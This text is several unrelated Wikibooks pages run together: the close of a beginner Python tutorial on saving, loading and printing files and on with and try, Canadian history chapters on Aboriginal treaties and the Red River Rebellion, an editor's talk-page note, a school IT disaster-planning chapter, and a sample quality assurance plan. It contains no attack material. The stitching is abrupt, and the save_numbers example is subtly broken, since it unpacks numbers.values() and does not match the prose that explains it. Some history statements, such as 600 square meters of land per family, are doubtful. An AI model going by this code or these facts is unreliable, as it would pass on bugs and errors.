    print('5. Load numbers')
    print('6. Save numbers')
    print('7. Quit')
    print()

phone_list = {}
menu_choice = 0
print_menu()
while True:
    menu_choice = int(input(&quot;Type in a number (1-7): &quot;))
    if menu_choice == 1:
        print_numbers(phone_list)
    elif menu_choice == 2:
        print(&quot;Add Name and Number&quot;)
        name = input(&quot;Name: &quot;)
        phone = input(&quot;Number: &quot;)
        add_number(phone_list, name, phone)
    elif menu_choice == 3:
        print(&quot;Remove Name and Number&quot;)
        name = input(&quot;Name: &quot;)
        remove_number(phone_list, name)
    elif menu_choice == 4:
        print(&quot;Lookup Number&quot;)
        name = input(&quot;Name: &quot;)
        print(lookup_number(phone_list, name))
    elif menu_choice == 5:
        filename = input(&quot;Filename to load: &quot;)
        load_numbers(phone_list, filename)
    elif menu_choice == 6:
        filename = input(&quot;Filename to save: &quot;)
        save_numbers(phone_list, filename)
    elif menu_choice == 7:
        break
    else:
        print_menu()

print(&quot;Goodbye&quot;)  
&lt;/source&gt;

Notice that it now includes saving and loading files.  Here is some output of my running it twice:

 1. Print Phone Numbers
 2. Add a Phone Number
 3. Remove a Phone Number
 4. Lookup a Phone Number
 5. Load numbers
 6. Save numbers
 7. Quit
 
 Type in a number (1-7): '''2'''
 Add Name and Number
 Name: '''Jill'''
 Number: '''1234'''
 Type in a number (1-7): '''2'''
 Add Name and Number
 Name: '''Fred'''
 Number: '''4321'''
 Type in a number (1-7): '''1'''
 Telephone Numbers:
 Name: Jill     Number: 1234
 Name: Fred     Number: 4321
 
 Type in a number (1-7): '''6'''
 Filename to save: '''numbers.txt'''
 Type in a number (1-7): '''7'''
 Goodbye

 1. Print Phone Numbers
 2. Add a Phone Number
 3. Remove a Phone Number
 4. Lookup a Phone Number
 5. Load numbers
 6. Save numbers
 7. Quit
 
 Type in a number (1-7): '''5'''
 Filename to load: '''numbers.txt'''
 Type in a number (1-7): '''1'''
 Telephone Numbers:
 Name: Jill     Number: 1234
 Name: Fred     Number: 4321
 
 Type in a number (1-7): '''7'''
 Goodbye

The new portions of this program are:
&lt;source lang=&quot;python&quot;&gt;
def load_numbers(numbers, filename):
    in_file = open(filename, &quot;rt&quot;)
    while True:
        in_line = in_file.readline()
        if not in_line:
            break
        in_line = in_line[:-1]
        name, number = in_line.split(&quot;,&quot;)
        numbers[name] = number
    in_file.close()

def save_numbers(numbers, filename):
    out_file = open(filename, &quot;wt&quot;)
    for k, v in numbers.values():
        out_file.write(k + &quot;,&quot; + v + &quot;\n&quot;)
    out_file.close()
&lt;/source&gt;

First we will look at the save portion of the program.  First it creates a file object with the command &lt;code&gt;open(filename, &quot;wt&quot;)&lt;/code&gt;.  Next it goes through and creates a line for each of the phone numbers with the command &lt;code&gt;out_file.write(x + &quot;,&quot; + numbers[x] + &quot;\n&quot;)&lt;/code&gt;.  This writes out a line that contains the name, a comma, the number and follows it by a newline.

The loading portion is a little more complicated.  It starts by getting a file object.  Then it uses a &lt;code&gt;while True:&lt;/code&gt; loop to keep looping until a &lt;code&gt;break&lt;/code&gt; statement is encountered.  Next it gets a line with the line &lt;code&gt;in_line = in_file.readline()&lt;/code&gt;.  The &lt;code&gt;readline&lt;/code&gt; function will return a empty string when the end of the file is reached. The &lt;code&gt;if&lt;/code&gt; statement checks for this and &lt;code&gt;break&lt;/code&gt;s out of the &lt;code&gt;while&lt;/code&gt; loop when that happens.  Of course if the &lt;code&gt;readline&lt;/code&gt; function did not return the newline at the end of the line there would be no way to tell if an empty string was an empty line or the end of the file so the newline is left in what &lt;code&gt;readline&lt;/code&gt; returns.  Hence we have to get rid of the newline.  The line &lt;code&gt;in_line = in_line[:-1]&lt;/code&gt; does this for us by dropping the last character.  Next the line &lt;code&gt;name, number = in_line.split(&quot;,&quot;)&lt;/code&gt; splits the line at the comma into a name and a number.  This is then added to the &lt;code&gt;numbers&lt;/code&gt; dictionary.

=== Advanced use of .txt files ===

You might be saying to yourself, &quot;Well I know how to read and write to a textfile, but what if I want to print the file without opening out another program?&quot;

There are a few different ways to accomplish this. The easiest way does open another program, but everything is taken care of in the Python code, and doesn't require the user to specify a file to be printed. This method involves invoking the subprocess of another program. 

Remember the file we wrote output to in the above program? Let's use that file. 
Keep in mind, in order to prevent some errors, this program uses concepts from the Next chapter. Please feel free to revisit this example after the next chapter.

&lt;source lang=&quot;Python&quot;&gt;
import subprocess
def main():
    try:
        print(&quot;This small program invokes the print function in the Notepad application&quot;)
        #Lets print the file we created in the program above
        subprocess.call(['notepad','/p','numbers.txt'])
    except WindowsError:
        print(&quot;The called subprocess does not exist, or cannot be called.&quot;)

main()
&lt;/source&gt;

The &lt;code&gt;subprocess.call&lt;/code&gt; takes three arguments. The first argument in the context of this example, should be the name of the program which you would like to invoke the printing subprocess from. The second argument should be the specific subprocess within that program. For simplicity, just understand that in this program, &lt;code&gt;'/p'&lt;/code&gt; is the subprocess used to access your printer through the specified application. The last argument should be the name of the file you want to send to the printing subprocess. In this case, it is the same file used earlier in this chapter.

      <text xml:space="preserve">=== ...or how to handle errors ===

=== closing files with with ===

We use the &quot;with&quot; statement to open and close files.&lt;ref&gt;
[http://docs.python.org/3.4/reference/compound_stmts.html#the-with-statement &quot;The 'with' statement&quot;]
&lt;/ref&gt;&lt;ref&gt;
[http://preshing.com/20110920/the-python-with-statement-by-example/ 'The Python &quot;with&quot; Statement by Example']
&lt;/ref&gt;

&lt;source lang=&quot;python&quot;&gt;
with open(&quot;in_test.txt&quot;, &quot;rt&quot;) as in_file:
    with open(&quot;out_test.txt&quot;, &quot;wt&quot;) as out_file:
        text = in_file.read()
        data = parse(text)
        results = encode(data)
        out_file.write(results)
    print( &quot;All done.&quot; )
&lt;/source&gt;

If some sort of error happens anywhere in this code
(one of the files is inaccessible,
the parse() function chokes on corrupt data,
etc.)
the &quot;with&quot; statements guarantee that all the files will eventually be properly closed.

{{todo|
Is the &quot;closing files with with&quot; section too much detail for a non-programmers tutorial?
If so, move it to some other Python Wikibook ([[Subject:Python programming language]])
}}

=== catching errors with try ===
So you now have the perfect program, it runs flawlessly, except for one detail, it will crash on invalid user input.  Have no fear, for Python has a special control structure for you.  It's called &lt;code&gt;try&lt;/code&gt; and it tries to do something.  Here is an example of a program with a problem:
&lt;source lang=&quot;python&quot;&gt;
print(&quot;Type Control C or -1 to exit&quot;)
number = 1
while number != -1:
   number = int(input(&quot;Enter a number: &quot;))
   print(&quot;You entered:&quot;, number)
&lt;/source&gt;

Notice how when you enter &lt;code&gt;@#&amp;&lt;/code&gt; it outputs something like:

 Traceback (most recent call last):
  File &quot;try_less.py&quot;, line 4, in &lt;module&gt;
    number = int(input(&quot;Enter a number: &quot;))
 ValueError: invalid literal for int() with base 10: '\\@#&amp;'

As you can see the &lt;code&gt;int()&lt;/code&gt; function is unhappy with the number &lt;code&gt;@#&amp;&lt;/code&gt; (as well it should be).  The last line shows what the problem is; Python found a &lt;code&gt;ValueError&lt;/code&gt;.   How can our program deal with this?  What we do is first: put the place where errors may occur in a &lt;code&gt;try&lt;/code&gt; block, and second: tell Python how we want &lt;code&gt;ValueError&lt;/code&gt;s handled.  The following program does this:
&lt;source lang=&quot;python&quot;&gt;
print(&quot;Type Control C or -1 to exit&quot;)
number = 1
while number != -1:
    try:
        number = int(input(&quot;Enter a number: &quot;))
        print(&quot;You entered:&quot;, number)
    except ValueError:
        print(&quot;That was not a number.&quot;)
&lt;/source&gt;

Now when we run the new program and give it &lt;code&gt;@#&amp;&lt;/code&gt; it tells us &quot;That was not a number.&quot; and continues with what it was doing before.

When your program keeps having some error that you know how to handle, put code in a &lt;code&gt;try&lt;/code&gt; block, and put the way to handle the error in the &lt;code&gt;except&lt;/code&gt; block.

=== Exercises ===
Update at least the phone numbers program (in section [[../Dictionaries|Dictionaries]]) so it doesn't crash if a user doesn't enter any data at the menu.

      <text xml:space="preserve">So here we are at the end, or maybe the beginning.  This tutorial is on Wikibooks, so feel free to make improvements to it. If you want to learn more about Python, [http://docs.python.org/3.2/tutorial/index.html The Python Tutorial] by [http://www.python.org/~guido/ Guido van Rossum] has more topics that you can learn about.   If you have been following this tutorial, you should be able to understand a fair amount of it.  The [[Python Programming]] wikibook can be worth looking at, too.  Here are few other books which cover Python 3:

* [http://www.swaroopch.com/notes/Python A Byte of Python by Swaroop C H]
* [http://anh.cs.luc.edu/python/hands-on/3.1/handsonHtml/index.html Hands-on Python Tutorial by Dr. Andrew N. Harrington] 
* [[Subject:Python programming language]] lists other Wikibooks related to Python.

Hopefully this book covers everything you have needed to get started programming.  Thanks to everyone who has sent me emails about it.  I enjoyed reading them, even when I have not always been the best replier.  

Happy programming, may it change your life and the world.

      <text xml:space="preserve">== 100 Centuries Ago-1497 ==


· 100 centuries ago - Aboriginals come from Asia in boats and over land bridge as Ice Age ends.  Hunt mammoths and buffalo. 
  
·100-50 centuries ago - Slowly societies evolve, complete with alliances, trading, war, and art.  Expansion across the continent leads to settlements throughout Canada.
  
· 4.000 years ago - Tunits followed caribou and muskox into the Arctic and settle.
  
· 1,000 years ago - Inuit come to Arctic, Tunit mysteriously disappear. Climate is considerably warmer than today.  The Inuit were the last great migration of First Nations, all the other Native populations were settled by this point.
  
· 1,000 years ago - Leif Ericsson and the Norse find Canada.  
  
· 1,000 years ago - Leif Ericsson attempts to settle Canada but a combination of fierce Natives, rough seas, a cooling climate drive him and his people away.
 
· 1497 - John Cabot lands in Canada. Lunn, Janet, and Christopher Moore.

== Late 1800's ==
 
The first treaties between the First Nations and the European Settlers were signed in 1871.  These treaties were the Europeans' way of controlling the First Nations in a legal, non-violent manner. However, the terms on which these treaties were written were far from fair. The treaties asked the First Nations to sign away most of the land which they occupied in return for a grant of 600 square meters of land per family of 5 people. 

Some of this land would be used for the Europeans' settlements' infrastructure. The Europeans also asked the First Nations to promise to keep alcohol off the reserves in order to help keep the peace. The First Nations were offered a small sum of money, rights to hunt and fish on their own land (which they already had), lessons in how to farm the land they were given, and schooling for the young First Nations so that they could learn to read and write English. The First Nations appeared to be selfless in their act to agree to the terms of the Europeans. However the First Nations didn’t really have a choice because their natural food sources were slowly disappearing.  The First Nations needed land to get their food and an income so that if their yield that year wasn’t enough they could purchase extra food.

== 1948-Present ==

In 1948,The Canadian Government signed the Universal Declaration of Human Rights.  This document states a common standard of achievement for all peoples and nations where teaching and education promote respect for all rights and freedoms. The Canadian Government had to re-examine its treatment of the Aboriginal Peoples to make sure they followed the decrees of the declaration. The government then decided to introduce the Indian Act in 1951.  It allowed aboriginals to perform key cultural ceremonies, such as pow-wows and potlatches. Aboriginals were granted the right to posess and drink alcohol, but only on their reserves.  The Aboriginal Peoples were also granted the right to sue the government over land claims, though none of them did successfully.  Nine years later, voting rights were extended to aboriginals.

In 1969, Prime Minister Pierre Trudeau tried to cut off all negotiations with any Native people in terms of land claims and treaties. However, the natives countered with a document called the Red Paper which convinced the government to change its policies.
 
By 1970, aboriginal civil rights were regularly discussed in the media and aboriginals were granted the right to drink outside of their reserves. 15 years later, the Canadian Indian act restored Native status to many women and their children.

      <text xml:space="preserve">The events in Canadian History that the Métis peoples are most associated with is The Red River Rebellion. The Red River Rebellion (or Red River Resistance) refers to the events triggered by the provisional government formed by the Métis people of the Red River Colony (which is now Manitoba) in 1869-1870. The leader of the provisional government was a Métis man named [[Louis Riel]].

= The Red River Settlement =

The Métis already had their own community set up at the junction of the two rivers, the Red and the Assiniboin. This was probably because they could have access to the waterways and canoe to places to trade. Some of the best prairie soils were there so they lived comfortably with crops and the buffalo hunt to sustain them through the winter, and because of their French background, they laid out their farms in seigneurial pattern, i.e. long narrow plots with one end on the river. Pemmican played a huge part in their lives because they ate it in the winter and while traveling and they traded it with the North-West Company for supplies.

Then the colony that Lord Selkirk decided to set up was right where the Métis lived. His colony was set up in the traditional English fashion, in square lots that paid no attention to what the land looked like. A colony in the Sahara would look very similar on a map to a colony in Hawaii. This naturally clashed with the Métis already living in the area.

=Causes of the Rebellion=

Three things: British incompetence, Métis pride, and both groups trying to use the same land. Well, and necessity for food/income.
The British set up camp on the Red River in 1812. By the time they finally arrived, though, they realized they hadn't brought enough food, and it was autumn, so they couldn't grow anything. The Métis had pity on them and gave them food for the winter. A mistake, as it happens. The Scottish governor, MacDonnell, issued a proclamation saying all stores of pemmican, a Métis export, were to be given to the colonists. The Métis depended on the sale of pemmican for income, however, and they couldn't survive without money either.
The Métis were not to be meekly forced off their land by William McDougall with a squared map, either. The colonists built Fort Douglas and Fort Garry at river junctions. These they had to build multiple times, as they were burned down by angry Métis residents.

== HBC Changes ==

In 1869, the Hudson’s Bay Company sold Rupert’s Land to the Canadian Government. Upon this, the Canadian Government appointed an anti-French Lieutenant Governor named William McDougall. The Métis feared losing their rights to the land and their culture as a result of this, as many had no clear deeds to their farm land, and greatly opposed his appointment.

== The Canadian Party ==

= The Uprisings =

On October 11, 1869, Riel and a group of Métis confronted and disrupted the surveyors. Later, the same people formed a group whose purpose was to represent to the Métis and people living in the Red River Settlement.

On October 25, 1869, Riel declared that any further surveyors or others sent by McDougall would be blocked from entering the settlement until further discussion.

Most of the settlement was in favour of supporting the Métis and their rights, but there was a resilient and small group of people in the settlement that formed a Canadian Party. McDougall appointed a few men to arrest the Métis occupying Upper Fort Garry in the settlement, and a man named Dr. John Christian Schultz managed to accumulate roughly 50 men to assist. Riel heard of the threat and gathered several more people to surround Schultz’s house.

Schultz and his followers surrendered as they were significantly outnumbered. On December 8th, the previous group formed when the Metis confronted the surveyors (the Métis National Committee) declared a provisional government. Ten days later, McDougall and Colonel Dennis (the man McDougall had appointed to arrest the Métis) transferred to Ontario.
 
With the advancements of the provisional government in the Canadian government’s absence, the Metis people seemed to be doing well. However, on January 9th, 1870 there was a prison break at Fort Garry, where those who were allied with Schultz were held. 12 prisoners in total escaped, including a man named Thomas Scott and another named Charles Mair. Two weeks later, John Schultz escaped as well, and by February, Riel had let the rest of the prisoners go free, so long as they swore to no longer interfere with the Métis. However, Scott, Mair and Schultz had every intention to do so.

Scott and Mair proceeded to the Canadian settlements and met Major Charles Boulton, a supporter of the Canadian Party. Boulton and his men planned to rendezvous with Schultz and overthrow the Métis, but he had misgivings and turned his party back. However, the Métis detected his movements, and captured him and his men. Scott was apprehended with Boulton, but Mair and Schultz managed to flee to Ontario and avoid capture.

Riel tried to have Boulton executed, but through several intercessions, he was pardoned. Scott openly bad-mouthed the Métis and saw Boulton’s pardon as a weakness on the Métis’ part. Soon Scott was put on trial, and sentenced to death for treason. Scott was executed by firing squad in March 1870.

= After Events/Effects of the Rebellion =

After Scott’s execution, Mair and Schultz arrived in Ontario and quickly tried to spread their anti-Métis attitude throughout the province using Scott’s execution. Still, John A. Macdonald had already realized that he needed to negotiate with the Métis. After much negotiation, Macdonald and the delegates formed the framing of what would be the Manitoba Act, which would admit Manitoba into the Canadian Confederation.

However, many Ontarians were still angered over Scott’s execution, so some time later a Canadian militia expedition was dispatched to the Red River area, now Manitoba, led by Colonel Garnet Wolseley, and was named the Wolseley expedition accordingly. Upon hearing that the militia meant to lynch him, Riel fled from the Red River as the expedition arrived, marking the end of the Red River Rebellion.

==[[The Red River Rebellion]]==
Hi Talons2009,

I hope you're enjoying your time here at Wikibooks.  I just wanted to drop in and offer you some help if I could.  I see that you have created a couple of chapters to [[Canadian History]].  However, they are currently located in the wrong place.  [[The Red River Rebellion]] needs to be moved to [[Canadian History/The Red River Rebellion]] so that it does not look like it's a book in its own right.  I suspect there may be other chapters like this as well that also need to be moved.  Depending on when you created your account, you might not be able to move pages yet (I think the account has to be four days old).  So if you need help, just let me know.  I'd be glad to pitch in.

--[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 04:20, 26 March 2009 (UTC)

Thanks, Jomegat! 
TALONS2009 is actually a class account for a gifted students program in British Columbia, Canada. We edited many of the pages on the Canadian History page and are grateful to be contributing authors to a socials text. I'm not sure if too many of the students will be logging in, but I will post a link to this note on my class page and see if it prompts anyone to move on these corrections. If not, we will be back in September!
Thanks, 
TALONS Class</text>

      <text xml:space="preserve">== &lt;big&gt;'''What is Disaster Planning?'''&lt;/big&gt; ==



Disaster planning is having a plan prepared to be implemented in the event of a disaster. A disaster could be as small as one computer crashing to as destructive as a fire burning down the whole school. Every business, hospital, organization and school, regardless of their size, should have a disaster plan. While the planning process and the actual plan will vary based on the size and nature of the organization, the main idea is true for any size: Be prepared. If you are prepared for a disaster, the recovery time and losses will be significantly lowered. As a K-12 Technology Coordinator, you need to be in charge of the technology aspect of a disaster plan. In today's world, technology effects all aspects of the school; Schools rely on technology for teaching, storing student records and information, communication with stakeholders, and more. Therefore, you need to be prepared for a disaster, because even a small one will interrupt the school environment. 


This chapter will help you develop a plan for your school. Keep in mind, there is no perfect template for a disaster and you cannot always predict every type of disaster. You should not make a disaster plan for every possible crisis, rather, your disaster plan should be able to handle a variety of situations.


The Consortium for School Networking (CoSN), has taken on the initiative to prepare K-12 Technology Coordinators for disaster planning. They have realized that technology is affecting all aspects of the school and therefore the technology coordinator is very involved in the disaster plan. You can subscribe to their newsletter, view power points, case studies and briefs, as well as be informed of their professional development events at their website: [http://www.cosn.org/Initiatives/ITCrisisPrep/tabid/4507/Default.aspx CoSN]


[[Image:Disaster.jpg]]

This image depicts the process of disaster planning: Mitigation and Prevention and Preparedness - before the disaster, Response - during the disaster, and Recovery - after the disaster.



== '''Mitigation and Prevention:''' ==


&quot;Actions you take to identify preventable and unavoidable disasters and to address what can be done to eliminate or reduce the likelihood of a disaster and/or its accompanying risks&quot;&lt;ref&gt;Forum Crisis Preparedness 2007, Crisis Preparedness Leadership for IT Disaster Recovery. Retrieved from http://www.cosn.org/Initiatives/ITCrisisPrep/ToolsandResources/PresentationsandWorkshops/tabid/4643/Default.aspx&lt;/ref&gt;


===Step One - Brainstorm:===

The first thing you do before you can prepare, is to brainstorm the possible disasters that pose a threat to your school. You have to think internally and externally, about man-made disasters and natural disasters. The Nonprofit Coordinating Committee of New York has a guide, &quot;Disaster Planning, Emergency Preparedness and Business Continuity.&quot; While the guide's focus is on business continuity, there are still a lot of guidelines that can be applied to a technology disaster plan. The guidelines they give for where to start thinking about possible disasters is divided into historical, geographic, human error, and physical:

:::Historical: What types of emergencies have occurred in the community, at your facility, or nearby? (for example, fire, natural :::disasters, accidents, utility, etc.)

:::Geographic: What can happen as a result of your location? (e.g., proximity to: flood-prone areas; hazardous material production, :::storage or use; major transportation routes; power plants, etc.)

:::Human Error: What emergencies might be caused by employees? Are employees trained to work safely? Do they know what to do in an :::emergency? Human errors can result from poor training and supervision, carelessness, misconduct, substance abuse, fatigue, etc.

:::Physical: What types of emergencies could result from the design or construction of the facility? Does the physical facility enhance :::safety?

In addition to thinking about all those possibilities, you need to think about a disaster which prohibits access into your school for an unknown amount of time. You may not even be able to go in to retrieve your backed up files. Or you can enter the building to get your equipment, but then you need to remove it and bring it to another location. The idea in planning for a disaster is to plan for small problems as well as major disasters. When brainstorming, do not forget to plan for disasters that are not dramatic. A major natural disaster is not as likely as a power outage, a compromised system, or a network crash. It will not help you to always be prepared for major crises if you cannot handle weekly disasters. 


===Step Two - Assign a Team:===


If you are the only one that knows the disaster plan, and a disaster occurs when you are not there, the plan is useless. In a large organization, you will most likely be a part of a team creating the plan. Your component will be regarding the technology in the school, while someone else is in charge of the safety of the students, etc. There should be communication and cooperation between the team while creating the plan so that the plan is cohesive and possible. If you are the technology coordinator in a small school, you would not have a team. But, you should still make sure that there are people who know the ins and outs of the plan in case you are not there when disaster strikes.


When assigning your team, keep in mind that there needs to be a chain of command, so that in the case when the number one person is not there to place the plan in effect, the number two person can take charge and so on. If part of your plan is in techie language, it is very possible that you wasted your time writing your plan, because if no technical staff is available, it wont get implemented!

===Step Three - Risk Analysis:===


In CoSN's ‚&quot;Crisis Planning Brief,&quot; they say that after brainstorming, you need to perform a risk assessment/analysis, to ‚&quot;consider all possible threats and vulnerabilities and the consequences of each.&quot;&lt;ref&gt;Crisis Planning Brief, Crisis Preparedness Leadership for IT Disaster Recovery. Retrieved from http://www.cosn.org/Resources/ResourceLibrary/tabid/4189/id/19/Default.aspx&lt;/ref&gt;


Performing a Risk Assessment:&lt;ref&gt;http://www.cosn.org/Initiatives/ITCrisisPrep/ToolsandResources/DisasterPlanningRecovery/Mitigation/tabid/4510/Default.aspx&lt;/ref&gt;


&lt;nowiki&gt;* Analyze processes and functions deemed mission-critical.&lt;/nowiki&gt;

&lt;nowiki&gt;* Identify types of potential disasters and impact of each on mission-critical items.&lt;/nowiki&gt;

&lt;nowiki&gt;* Prioritize based on acceptable period of unavailability.&lt;/nowiki&gt;

&lt;nowiki&gt;* Chart the workflow, considering hardware, software, people and other resource &lt;/nowiki&gt; requirements for continued operations.

Retrieved from http://www.cosn.org/Initiatives/ITCrisisPrep/ToolsandResources/PresentationsandWorkshops/tabid/4643/Default.aspx&lt;/ref&gt;



===Step Four - Prepare and Write Plan:===


Now that you have brainstormed possible disasters, collected a team, and preformed a risk analysis, you need to actually write your plan. Your disaster plan should have three components: What to do to prepare for a disaster, what to do during the disaster, and what to do after the disaster. 


-Take preventive measures (based on brainstormed possibilities). Some examples: secure your data, back it up, back it up at a remote location, have off site office space, make multiple copies of the plan, and have the plan backed up off site too. (If the plan is caught in the disaster, not so useful!)


-Identify and list resources (hardware and software), operations and records. Go through and classify what is critical, important, and not so important. Regularly update these lists. 
Have lists for the major software vendors you can call in the time of need.&lt;ref&gt;Terrill, T. (2006) Technology on a Shoestring. A Survival Guide for Educators and other Professionals. New York and London. Teacher's College Press.&lt;/ref&gt; 


-Have a fireproof box that can hold sensitive and vital information.


-Communicate with partners who can help in the time of emergencies, such as consultants and local emergency agencies. Also, have lists of computer vendors, and computer rental companies in the area. 


-&quot;Have a list of contact numbers for people who would need to be contacted during an emergency. This list should be in the hands of multiple people and it should include everyone's number don't assume that you will have access to the Rolodex sitting on your desk or that your palm pilot will be working.&quot;&lt;ref&gt;Terrill, T. (2006) Technology on a Shoestring. A Survival Guide for Educators and other Professionals. New York and London. Teacher's College Press.&lt;/ref&gt; 



-Plan for worst case scenarios. For example, all regular communication lines are unavailable. Have a backup plan for communicating.


The Plan should be written clearly and organized very well. There should be detailed tasks that need to be completed and it should be broken down into sections. You do not want to put all this work into preparing your plan and then it doesn't get used because the plan is not clearly written and you are not around to explain it.

===Step Five - Practice:===


The plan needs to be reviewed and practiced regularly for the best results of quick recovery. In jobs people come and go, so make sure to keep reviewing so that new people can learn it too. Continuously check your backups to make sure they are reliable. The employees involved in the plan should know what they have the authority to do in times of disaster. The more you practice, prepare, review, and train the easier it will be to recover from a disaster. 


== '''Response:''' ==

Retrieved from http://www.cosn.org/Initiatives/ITCrisisPrep/ToolsandResources/PresentationsandWorkshops/tabid/4643/Default.aspx&lt;/ref&gt;



===Step Six - Implement Plan:===


When disaster strikes, you need to implement your plan. If you are not there, you need to have someone at the school who knows what to do. How does someone know when it is a disaster? This should be made clear in the training sessions. 


You need to stay calm during the disaster. When you need to communicate, speak fast but clearly and say the most important things. If communication is cut, implement the backup communication (indicated in plan) and be organized. 



== '''Recovery:''' ==


&quot;The aim of the recovery phase is to restore the affected area to its previous state&quot;&lt;ref&gt;http://en.wikipedia.org/wiki/Emergency_management&lt;/ref&gt;


The goal of recovery is to return to a regular school day as soon as possible. If it was a small disaster and it will only take a few hours to reload all the information back into the computers, (hopefully everything was backed up and the back up was not damaged) and the recovery time will be short. If it was a large disaster and the computers cannot be used for a few months, without a plan your school could be out for months and your information cannot be accessed during that time. But, if you have a plan, such as contacting a computer rental company and having your data backed up at a remote location, the rentals can keeping the school days running normally and you will have access to your information. If you have been forced to evacuate the building for an unknown amount of time, hopefully you have temporary space set up for classes to run and for the equipment to be brought there. As mentioned at the beginning of the chapter, there is no cookie-cut disaster plan. You just have to plan as well as you can and hopefully your plan can tackle any disaster.

===Tips:===


Don't think 'this won't happen to me.' Always be prepared.

Always update and review your records, your team, and your plan.

Practice, practice, practice. 

== '''Example Quality Assurance Plan (QAP)''' ==

===Introduction===

'''Introduction to the Plan (Choice of Scenario):'''

The company I intend to write a Quality Assurance proposal for will be for a university setting. I shall refer to the university throughout this proposal as University of X.  University of X has one of the largest campuses in the Nation. Security is always an issue, and the result of what dreadfully occurred on the campus of Virginia Polytechnic Institute and State University has and will for ever be a turning point for security measures on campuses nationwide. This proposal serves only as an example. I furthermore hope this information may be used in practicality to serve the better good to aid in supplying more efficient safety and security to students, faculty and staff.

The purpose of this plan is to provide a quality assurance method to assist local security and police officers with specific means to broadcast critical safety information in real-time to a large number of students, faculty and staff.  


'''Introduction of the Project for the Plan:'''

The project will involve researching available communications technologies and understanding the practicality of such devices and their means of transmitting and receiving information (data). Furthermore I will create an online survey and distribute it to Chiefs of Security at 25 comparable universities nation wide. The results of this survey will help me to compare security procedures and the uses of technology which are in practice by these universities. 
ADD PIC

'''Company Background:'''

The University was established in the early 1800’s and is nationally and internationally ranked. Though being a public institution, the out-of-state cost of tuition for graduates and undergraduates is one of the most expensive in the nation. The University enrolls over 36,000 students annually and employs over 10,000 faculty and staff. The campus is divided into two sections, South Campus and North Campus. Combined they measure over 1,400 acres (5.7 km²).

'''Areas for the Company to Improve (Strengths and Weaknesses):'''

The main area for improvement within University of X is within the Department of Security. The connection between campus security, local Police and Fire Departments needs to be defined. For the safety of students, faculty and staff, critical safety information needs to be supplied to these persons in real-time. There exist many different procedures and ways of doing so, though many different topics need to be taken into consideration. Such considerations are as follows:

•	Budget
•	Technology
•	User-ability of such technology
•	Practicality of such technology
•	Overall Quality Assurance of such technology
•	Efficiency 


===Scope===

'''Scope of the Plan:'''

To begin the project I need to appoint a team which will consist of five to six persons. This team will brainstorm and devise a series of thirty questions. The questions will then be placed into an online survey and then submitted to 15 Universities. When the universities Department of Security fills out the survey, the information is submitted in real time. At this point I will collaborate with one or more experienced Security officers to extrapolate the data. This data will allow me to know the types of security technology and methods which are used and set in place at different universities. 

While this plan will involve a great deal of research there will exist limitations. Such limitations may include but are not limited to:

•	Retrieving information regarding private security procedures.
•	Retrieving data from my survey and incorporating it prior to the end of this course.
•	Deciphering the data and collaborating with one or more campus security specialists.

'''Outline Quality Assurance issues and problems.  Determine what the problem includes and what it does not include.'''

There does not seem to exist a plausible method for distributing specific accurate information wirelessly and in real-time to a dense population. Technologies exist such as the Internet, Cell Phones, Text Messaging, and Digital/Analog Radio. For example: A mass email is sent to the entire campus population consisting of safety information pertaining to a possible hurricane warning. Some students may be in transit and may not be able to check their email. Therefore this process concludes to be partially non-effective. Another example: A Text Message was sent to the population of students pertaining to a water main which has broken. Some students may have their cellular devices on silent, or may not own a cellular device. Furthermore many students may not have subscribed to such a service allowing security to alert them via text messaging pertaining to campus wide safety alerts. 



'''Objectives of the QA Plan:'''

The primary objective of this Quality Assurance Plan (QAP) will be to provide statistical and comparative information to College and University Campus Security Departments Nationwide. The QAP is focused on one hypothetical University, though the data which I will provide will be used for practical purposes. This QAP will serve as the foundation for my project and I intend to build upon this idea up to and surpassing the completion of this course. 

'''Approach (outline the methodologies or work to be done):'''

The primary approach I will need to take is to devise a survey consisting of specific questions (open ended and closed) and to submit to several different educational institutions. The process is then dependent on the Institution to fill out the survey and to then submit it. I will be using a survey engine (Surveymonkey) which will allow me to obtain the data in real time as well as other options such as exporting data into Excel for quick review and comparisons. After most more then 50% of the institutions have filled out the survey and submitted it, I will then be able to review the data. This data will be reviewed by myself as well as A institution security officer professional. As far as disclosing the schools involved in this project, I am uncertain at this time that listing names is possible.

'''Purpose of the plan:'''

The purpose of this plan is to allow any number of educational institutions to analyze and learn many approaches regarding the ability to broadcast communications to students, faculty and staff on a campus-wide scale. Due to the nature of our world today, crime on campuses is inevitable. Natural disasters on campus are as well an issue. In order to broadcast a message in real-time campus wide, some new technology may need to be implemented. The overall conclusion and most cost effective method may be the use of cellular phones, and the requirement to list your number with the local security office. I hope to review alternative and possible more effective methods. The overall information from this QA Plan can serve as a foundation for institutions nationwide to become familiar with alternative means of distributing information wirelessly. 


===Plan===

'''Define the QA plan for the Company:'''

The Quality Assurance Plan (QAP) will assure educational institutions with the processes needed to disperse information quickly and accurately. This includes but is not limited to specific technological devices. This plan will also serve as a basis for allowing institutions nationwide to become familiar with alternative means of communications disbursing. 

'''Determine the process and procedures for your plan (design, development, implementation, maintenance, revisions):'''

The main part of the QAP will be the survey. The survey will consist of several questions which will hopefully be answered in a timely fashion. I may not be able to determine some data such as:
•	How many cell phones are on campus?
•	How many handheld PDA devices are on campus?
•	How many MP3 devices are on campus?

For the most part I feel it is plausible to assume in this day and age, over 95% of students, faculty and staff on campus own a cellular device.

'''Reviews (how will reviews be conducted):'''

The reviews will be conducted by myself and possibly someone with a significant background in campus security. The reviews will be for educational purposes only. I may take the data a step further and allow more professionals to analyze the data and allow constructive feedback. The simple notion I am aiming for is what alternative sources are available today which are cost effective and easily implemented. I will be conducting research via Internet to venture into the world of different types of wireless devices. This data will be included.


===Standards===

'''Define the standards for your organization (ISO, IEEE…etc)'''

'''List and identify the specific standards that you will use for the QA plan:'''

My organization(s) will be using the ISO/IEC 15408 standard for their new QA process. This standard is defined as Evaluation Criteria for Information Technology Security (Wikipedia, ISO ISO/IEC 1540).

'''Explain the methods and techniques that will be used to meet standards'''

While transmitting confidential information wirelessly, the standards set in place insure the correct method of doing so is accurate and safe. The methods and techniques may seem tedious, though will be proven effective. Information submitted campus wide needs to be overlooked by three Security personnel as well as the president of the institution. This insures the accuracy of the information being transmitted. If an emergency occurs, the approval of the president of the institution is only needed. The method for transmitting this information will be by:

•	Email
•	Cellular text messages (MMS, SMS)
•	CCTV (Closed Circuit Television)
•	Verbal announcements (via PA system)


 
'''Describe the procedures and explain the goals or purpose of procedures:'''

